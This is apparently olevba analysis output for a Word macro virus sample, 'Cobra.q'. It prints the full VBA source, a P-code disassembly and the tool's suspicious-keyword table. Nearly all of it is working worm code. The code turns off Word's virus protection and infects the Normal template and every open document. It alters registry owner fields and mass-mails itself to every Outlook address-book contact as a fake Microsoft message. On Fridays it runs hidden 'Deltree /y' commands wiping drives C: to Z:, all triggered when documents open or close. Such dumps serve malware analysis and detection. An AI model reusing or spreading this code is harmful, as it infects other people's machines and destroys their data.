olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cobra.q
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cobra.q - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AFATEHA.bas 
in file: ./Virus.MSWord.Cobra.q - OLE stream: 'Macros/VBA/AFATEHA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'AFATEHA Version 1.0A
Sub PRT()
On Error Resume Next
CustomizationContext = NormalTemplate
For IOT = 1 To 3
CommandBars("Macro").Controls(IOT).OnAction = "ViewVBCode"
Next
CommandBars("View").Controls("Toolbars").Delete
Options.VirusProtection = False
Options.SaveNormalPrompt = False
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
End Sub
Sub IDN()
On Error Resume Next
Set N = NormalTemplate
Set D = ActiveDocument
NIN = False
For Each M In N.VBProject.VBComponents
If M.Name = "AFATEHA" Then NIN = True
If M.Name <> "ThisDocument" And M.Name <> "AFATEHA" Then Application.OrganizerDelete Source:=N.FullName, Name:=M.Name, Object:=wdOrganizerObjectProjectItems
Next
If NIN = False Then Application.OrganizerCopy Source:=D.FullName, Destination:=N.FullName, Name:="AFATEHA", Object:=wdOrganizerObjectProjectItems
For Each OD In Documents
For Each M In OD.VBProject.VBComponents
DIN = False
If M.Name = "AFATEHA" Then DIN = True
If M.Name <> "AFATEHA" And M.Name <> "Reference to Normal" And M.Name <> "ThisDocument" Then Application.OrganizerDelete Source:=OD.FullName, Name:=M.Name, Object:=wdOrganizerObjectProjectItems
Next
If DIN = False Then
Application.OrganizerCopy Source:=N.FullName, Destination:=OD.FullName, Name:="AFATEHA", Object:=wdOrganizerObjectProjectItems
OD.SaveAs OD.FullName, wdFormatDocument, False
End If
Next
End Sub
Sub ViewVBCode()
End Sub
Sub ChithiPathanoo()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Fateha N Liton" Then
ADS = "'" + String(50, "-") + Chr(13) + _
"'" + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") + Chr(13) + _
"'" + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") + Chr(13) + _
"'" + String(50, "-")
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Fateha N Liton"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "Shibrampur/Burichang/Comilla/BD"
ActiveDocument.VBProject.VBComponents("AFATEHA").CodeModule.InsertLines ActiveDocument.VBProject.VBComponents("AFATEHA").CodeModule.CountOfLines + 1, ADS
End If
Dim UD, DAS, AB, BO, TOT
Set UD = CreateObject("Outlook.Application")
Set DAS = UD.GetNameSpace("MAPI")
DAS.Logon "profile", "password"
For LO = 1 To DAS.AddressLists.Count
Set AB = DAS.AddressLists(y)
XAX = 1
Set BO = UD.CreateItem(0)
For IOT = 1 To AB.AddressEntries.Count
TOT = AB.AddressEntries(XAX)
BO.Recipients.Add TOT
XAX = XAX + 1
Next IOT
BO.Subject = "Important Message From Microsoft Via " & Application.UserName
BO.Body = "Important document:-"
BO.Add ActiveDocument.FullName
BO.Send
TOT = ""
Next LO
DAS.Logoff
End Sub
Sub NostoHD()
If WeekDay(Date) = 6 Then
For IOT = 67 To 67 + 23
Shell "Deltree /y " & Chr(IOT) & ":\", vbHide
Next
End If
End Sub
Sub FileNew()
Call PRT
Call IDN
Call ChithiPathanoo
Call NostoHD
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileExit()
Call PRT
Call IDN
Call ChithiPathanoo
Call NostoHD
WordBasic.FileExit
End Sub
Sub FileOpen()
Call PRT
Call IDN
Call ChithiPathanoo
Call NostoHD
Dialogs(wdDialogFileOpen).Show
End Sub
Sub AutoClose()
Call PRT
Call IDN
Call ChithiPathanoo
Call NostoHD
End Sub
Sub AutoOpen()
Call PRT
Call IDN
Call ChithiPathanoo
Call NostoHD
End Sub
'--------------------------------------------------
'ETAC
'BAGLADESH
'--------------------------------------------------
'--------------------------------------------------
'DEFODDILS
'KALABAGAN
'--------------------------------------------------
'--------------------------------------------------
'TOMTOM
'NAGPUR, INDIA
'--------------------------------------------------
'--------------------------------------------------
'
'
'--------------------------------------------------
'--------------------------------------------------
'
'
'--------------------------------------------------
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cobra.q
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/AFATEHA - 8097 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "AFATEHA Version 1.0A"
' Line #1:
' 	FuncDefn (Sub PRT())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #4:
' 	StartForVariable 
' 	Ld IOT 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #5:
' 	LitStr 0x000A "ViewVBCode"
' 	Ld IOT 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #6:
' 	StartForVariable 
' 	Next 
' Line #7:
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF8 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub IDN())
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set N 
' Line #15:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set D 
' Line #16:
' 	LitVarSpecial (False)
' 	St NIN 
' Line #17:
' 	StartForVariable 
' 	Ld M 
' 	EndForVariable 
' 	Ld N 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #18:
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x0007 "AFATEHA"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NIN 
' 	EndIf 
' Line #19:
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x0007 "AFATEHA"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld N 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld M 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Next 
' Line #21:
' 	Ld NIN 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld D 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld N 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AFATEHA"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld OD 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #23:
' 	StartForVariable 
' 	Ld M 
' 	EndForVariable 
' 	Ld OD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #24:
' 	LitVarSpecial (False)
' 	St DIN 
' Line #25:
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x0007 "AFATEHA"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DIN 
' 	EndIf 
' Line #26:
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x0007 "AFATEHA"
' 	Ne 
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	And 
' 	Ld M 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld OD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld M 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #27:
' 	StartForVariable 
' 	Next 
' Line #28:
' 	Ld DIN 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #29:
' 	Ld N 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld OD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AFATEHA"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #30:
' 	Ld OD 
' 	MemLd FullName 
' 	Ld wdFormatDocument 
' 	LitVarSpecial (False)
' 	Ld OD 
' 	ArgsMemCall SaveAs 0x0003 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Next 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Sub ViewVBCode())
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub ChithiPathanoo())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000E "Fateha N Liton"
' 	Ne 
' 	IfBlock 
' Line #39:
' 	LineCont 0x000C 10 00 00 00 22 00 00 00 34 00 00 00
' 	LitStr 0x0001 "'"
' 	LitDI2 0x0032 
' 	LitStr 0x0001 "-"
' 	ArgsLd String$ 0x0002 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "'"
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "'"
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "'"
' 	Add 
' 	LitDI2 0x0032 
' 	LitStr 0x0001 "-"
' 	ArgsLd String$ 0x0002 
' 	Add 
' 	St ADS 
' Line #40:
' 	LitStr 0x000E "Fateha N Liton"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #41:
' 	LitStr 0x001F "Shibrampur/Burichang/Comilla/BD"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #42:
' 	LitStr 0x0007 "AFATEHA"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld ADS 
' 	LitStr 0x0007 "AFATEHA"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	Dim 
' 	VarDefn UD
' 	VarDefn DAS
' 	VarDefn AB
' 	VarDefn BO
' 	VarDefn TOT
' Line #45:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set UD 
' Line #46:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld UD 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set DAS 
' Line #47:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld DAS 
' 	ArgsMemCall Logon 0x0002 
' Line #48:
' 	StartForVariable 
' 	Ld LO 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DAS 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #49:
' 	SetStmt 
' 	Ld y 
' 	Ld DAS 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AB 
' Line #50:
' 	LitDI2 0x0001 
' 	St XAX 
' Line #51:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld UD 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set BO 
' Line #52:
' 	StartForVariable 
' 	Ld IOT 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AB 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #53:
' 	Ld XAX 
' 	Ld AB 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St TOT 
' Line #54:
' 	Ld TOT 
' 	Ld BO 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #55:
' 	Ld XAX 
' 	LitDI2 0x0001 
' 	Add 
' 	St XAX 
' Line #56:
' 	StartForVariable 
' 	Ld IOT 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	LitStr 0x0025 "Important Message From Microsoft Via "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld BO 
' 	MemSt Subject 
' Line #58:
' 	LitStr 0x0014 "Important document:-"
' 	Ld BO 
' 	MemSt Body 
' Line #59:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld BO 
' 	ArgsMemCall Add 0x0001 
' Line #60:
' 	Ld BO 
' 	ArgsMemCall Send 0x0000 
' Line #61:
' 	LitStr 0x0000 ""
' 	St TOT 
' Line #62:
' 	StartForVariable 
' 	Ld LO 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	Ld DAS 
' 	ArgsMemCall Logoff 0x0000 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub NostoHD())
' Line #66:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #67:
' 	StartForVariable 
' 	Ld IOT 
' 	EndForVariable 
' 	LitDI2 0x0043 
' 	LitDI2 0x0043 
' 	LitDI2 0x0017 
' 	Add 
' 	For 
' Line #68:
' 	LitStr 0x000B "Deltree /y "
' 	Ld IOT 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 ":\"
' 	Concat 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #69:
' 	StartForVariable 
' 	Next 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub FileNew())
' Line #73:
' 	ArgsCall (Call) PRT 0x0000 
' Line #74:
' 	ArgsCall (Call) IDN 0x0000 
' Line #75:
' 	ArgsCall (Call) ChithiPathanoo 0x0000 
' Line #76:
' 	ArgsCall (Call) NostoHD 0x0000 
' Line #77:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub FileExit())
' Line #80:
' 	ArgsCall (Call) PRT 0x0000 
' Line #81:
' 	ArgsCall (Call) IDN 0x0000 
' Line #82:
' 	ArgsCall (Call) ChithiPathanoo 0x0000 
' Line #83:
' 	ArgsCall (Call) NostoHD 0x0000 
' Line #84:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Sub FileOpen())
' Line #87:
' 	ArgsCall (Call) PRT 0x0000 
' Line #88:
' 	ArgsCall (Call) IDN 0x0000 
' Line #89:
' 	ArgsCall (Call) ChithiPathanoo 0x0000 
' Line #90:
' 	ArgsCall (Call) NostoHD 0x0000 
' Line #91:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub AutoClose())
' Line #94:
' 	ArgsCall (Call) PRT 0x0000 
' Line #95:
' 	ArgsCall (Call) IDN 0x0000 
' Line #96:
' 	ArgsCall (Call) ChithiPathanoo 0x0000 
' Line #97:
' 	ArgsCall (Call) NostoHD 0x0000 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub AutoOpen())
' Line #100:
' 	ArgsCall (Call) PRT 0x0000 
' Line #101:
' 	ArgsCall (Call) IDN 0x0000 
' Line #102:
' 	ArgsCall (Call) ChithiPathanoo 0x0000 
' Line #103:
' 	ArgsCall (Call) NostoHD 0x0000 
' Line #104:
' 	EndSub 
' Line #105:
' 	QuoteRem 0x0000 0x0032 "--------------------------------------------------"
' Line #106:
' 	QuoteRem 0x0000 0x0004 "ETAC"
' Line #107:
' 	QuoteRem 0x0000 0x0009 "BAGLADESH"
' Line #108:
' 	QuoteRem 0x0000 0x0032 "--------------------------------------------------"
' Line #109:
' 	QuoteRem 0x0000 0x0032 "--------------------------------------------------"
' Line #110:
' 	QuoteRem 0x0000 0x0009 "DEFODDILS"
' Line #111:
' 	QuoteRem 0x0000 0x0009 "KALABAGAN"
' Line #112:
' 	QuoteRem 0x0000 0x0032 "--------------------------------------------------"
' Line #113:
' 	QuoteRem 0x0000 0x0032 "--------------------------------------------------"
' Line #114:
' 	QuoteRem 0x0000 0x0006 "TOMTOM"
' Line #115:
' 	QuoteRem 0x0000 0x000D "NAGPUR, INDIA"
' Line #116:
' 	QuoteRem 0x0000 0x0032 "--------------------------------------------------"
' Line #117:
' 	QuoteRem 0x0000 0x0032 "--------------------------------------------------"
' Line #118:
' 	QuoteRem 0x0000 0x0000 ""
' Line #119:
' 	QuoteRem 0x0000 0x0000 ""
' Line #120:
' 	QuoteRem 0x0000 0x0032 "--------------------------------------------------"
' Line #121:
' 	QuoteRem 0x0000 0x0032 "--------------------------------------------------"
' Line #122:
' 	QuoteRem 0x0000 0x0000 ""
' Line #123:
' 	QuoteRem 0x0000 0x0000 ""
' Line #124:
' 	QuoteRem 0x0000 0x0032 "--------------------------------------------------"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

